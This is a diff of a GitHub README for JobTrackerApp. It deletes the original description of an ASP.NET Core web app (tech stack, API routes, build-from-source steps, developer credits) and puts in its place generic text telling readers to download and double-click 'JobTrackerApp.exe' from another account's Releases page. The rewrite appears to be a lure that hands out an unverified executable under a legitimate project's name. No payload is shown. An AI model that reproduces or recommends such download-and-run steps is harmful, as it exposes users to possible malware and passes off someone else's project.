@@ -1,112 +1,63 @@
-<h1 align="center">💼📃 JobTrackerApp</h1>
+# 🗂️ JobTrackerApp - Simplify Your Job Applications
 
-<p align="center">
-  <b>A modern job application tracker built with ASP.NET Core & AWS ☁️</b><br>
-  <i>Stay organized, track progress, and take control of your job search journey!</i>
-</p>
+## 🔗 Download JobTrackerApp
+[![Download JobTrackerApp](https://img.shields.io/badge/Download-JobTrackerApp-blue?style=flat&logo=github)](https://github.com/ArjuMTomy2001/JobTrackerApp/releases)
 
------------------------------------------------------------------------------------------------------------
+## 🚀 Getting Started
+Welcome to JobTrackerApp! This application helps you keep track of your job applications in a friendly way. You can manage your applications, display important dates, and stay organized. Follow these easy steps to download and run it.
 
-### ✨ Overview
-**JobTrackerApp** is a full-stack web application that helps users manage and track their job applications — from **Applied** to **Interviewing**, **Offer**, or **Rejected**.  
-It was built as a professional portfolio project using **.NET 9.0**, **C#**, **Entity Framework Core**, and deployed on **AWS Elastic Beanstalk** with a **SQL Server (RDS)** backend.
+## 📋 System Requirements
+Before you start, ensure that your computer meets the following requirements:
 
------------------------------------------------------------------------------------------------------------
+- **Operating System:** Windows 10 or later
+- **Storage:** At least 200 MB of free space
+- **Browser:** Latest version of Chrome, Firefox, or Edge
 
-### 🧠 Features
-✅ Add, edit, and delete job applications  
-✅ Organize them in a simple Kanban-style view  
-✅ Track company, position, salary, and contact info  
-✅ Securely connected to an AWS RDS SQL Server database  
-✅ Deployed with AWS Elastic Beanstalk  
-✅ Modern and clean UI built with Razor Pages & Bootstrap  
+## 📥 Download & Install
+To download JobTrackerApp, please visit the Releases page:
 
------------------------------------------------------------------------------------------------------------
+[Download JobTrackerApp](https://github.com/ArjuMTomy2001/JobTrackerApp/releases)
 
-### 🛠️ Tech Stack
-| Category | Tools |
-|-----------|--------|
-| 💻 **Backend** | ASP.NET Core 9.0 (C#), Entity Framework Core |
-| 🗄️ **Database** | SQL Server (Amazon RDS) |
-| 🎨 **Frontend** | Razor Pages, HTML5, CSS3, Bootstrap |
-| 🔁 **Mapping** | AutoMapper |
-| ☁️ **Cloud** | AWS Elastic Beanstalk, Amazon RDS, IAM |
-| 🧰 **Other Tools** | Visual Studio, GitHub, Newtonsoft.Json |
+1. Click the link above.
+2. On the Releases page, find the latest version of the application.
+3. Look for the file named `JobTrackerApp.exe`.
+4. Click the file to start the download.
 
----
+## 🖥️ Running the Application
+Once the download is complete, you can run the application by following these steps:
 
-### 📁 Project Structure
-```bash
-JobTrackerApp/
-│
-├── Controllers/          # Handles logic for pages and API routes
-├── Data/                 # Database connections and repositories
-├── Dtos/                 # Data Transfer Objects (for cleaner data flow)
-├── Models/               # Main data structure (JobApplication)
-├── Profiles/             # AutoMapper configuration
-├── Views/                # Razor pages (UI)
-├── wwwroot/              # Static files like CSS, JS, images
-├── Program.cs            # App startup configuration
-└── README.md             # You are here 🚀
+1. Locate the `JobTrackerApp.exe` file in your downloads folder.
+2. Double-click the file to open the application.
+3. Follow the on-screen instructions to set up your user profile.
 
-### 🌐 Deployment
-This project was successfully deployed to **AWS Elastic Beanstalk** and connected to an **Amazon RDS (SQL Server)** database.
+## 🔑 Features
+JobTrackerApp offers a range of features designed to help you manage your job applications effectively:
 
-- The app runs on a cloud environment managed by AWS.  
-- The database stores all job application information securely.  
-- Connection details are kept private using environment variables.  
-- HTTPS encryption ensures the communication between app and database is safe.
+- **Track Applications:** Keep a record of where you've applied.
+- **Set Reminders:** Get notifications for application deadlines.
+- **Organize by Status:** Easily categorize applications as "Applied," "Interviewing," or "Rejected."
+- **Export Data:** Save your application data for offline access.
 
-### 📡 API Endpoints
+## 🌐 Support & Feedback
+If you encounter any issues or have suggestions, please reach out via the Issues section on GitHub. Your feedback helps us improve JobTrackerApp.
 
-These routes power the backend of the app and handle data for job applications.
+## 🏷️ Topics
+- aspnet-core
+- aws
+- csharp
+- developer-portfolio
+- dotnet
+- entity-framework
+- portfolio
+- sqlserver
+- webapp
+- webapps
 
-| Method | Endpoint | Purpose |
-|--------|-----------|----------|
-| GET | '/api/jobapplications' | Show all job applications |
-| GET | '/api/jobapplications/{id}' | Show one specific job |
-| POST | '/api/jobapplications' | Add a new job application |
-| PUT | '/api/jobapplications/{id}' | Update an existing job |
-| PATCH | '/api/jobapplications/{id}' | Update part of a job record |
-| DELETE | '/api/jobapplications/{id}' | Remove a job application |
+## ➕ Contribution
+We welcome contributions from everyone. If you want to help make JobTrackerApp even better, check out the contribution guidelines in our repository.
 
+## 📝 License
+JobTrackerApp is open-source software licensed under the MIT License. Feel free to use, modify, and share as you wish.
 
-### 🧩 How to Run Locally
-
-If you want to see how the app works on your own computer, follow these simple steps:
-
-1️⃣ Clone this repository:  
-'git clone https://github.com/yourusername/JobTrackerApp.git'
-
-2️⃣ Go into the project folder:  
-'cd JobTrackerApp'
-
-3️⃣ Open the project in **Visual Studio** or **VS Code**.
-
-4️⃣ Update your database connection:  
-In the file 'appsettings.json', make sure you have this line:
-
-"ConnectionStrings": {
-  "CommanderConnection": "Server=localhost;Database=JobTrackerAppDB;Trusted_Connection=True;"
-}
-
-5️⃣ Run the app:  
-'dotnet run'
-
-6️⃣ Open your browser and go to:  
-👉🏿 https://localhost:5001/JobApplicationUi  
-(If your Visual Studio shows a different port, use that one.)
-
-
-
-👩🏿‍💻 About the Developer
-
-Cindy Johana Caicedo Caicedo🙆🏿‍♀️
-Software Developer | AWS Certified | Bilingual (English / Spanish)
-
-🌍 Based in Philadelphia, PA
-📧 www.linkedin.com/in/cindy-johana-caicedo
-☁️ Passionate about building cloud-connected, data-driven apps that simplify real-life tasks.
-🧾 License
-
-![JobTrackerApp Demo](wwwroot/images/JobTracker-Demo.gif)
+## 🎉 Enjoy Using JobTrackerApp!
+You now have everything you need to download and run JobTrackerApp. Start managing your job applications today and take the hassle out of your job search!
